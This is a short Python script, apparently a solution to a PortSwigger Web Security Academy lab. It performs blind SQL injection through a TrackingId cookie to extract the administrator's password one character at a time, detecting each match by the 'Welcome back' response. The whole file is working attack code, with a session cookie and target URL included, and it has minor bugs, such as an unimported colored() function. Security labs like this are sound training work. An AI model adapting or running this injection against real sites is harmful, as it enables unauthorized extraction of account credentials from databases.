import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLi():
    #p1.status("Iniciando ataque de fuerza bruta")
    print(f"Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

   # p2 = log.progress("Password")
    print(f"Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"mfRl7jDpanWEqwsP' and (select substring(password,{position},1) from users where username='administrator') = '{character}'-- -",
                'session': 'gnMd50ZKtoGnj8NYNS2gRA9yhpzcD0kH'
            }

           # p1.status(f"TrackingId")
           # print(f"TrackingId", {character})

            r = requests.get("https://0a4c0039042f828b82cb4c3800f300ed.web-security-academy.net/", cookies=cookies)

            if "Welcome back" in r.text:
                password+=character
                print({password})
                break
            #    print(character)

if __name__ == '__main__':
    makeSQLi()
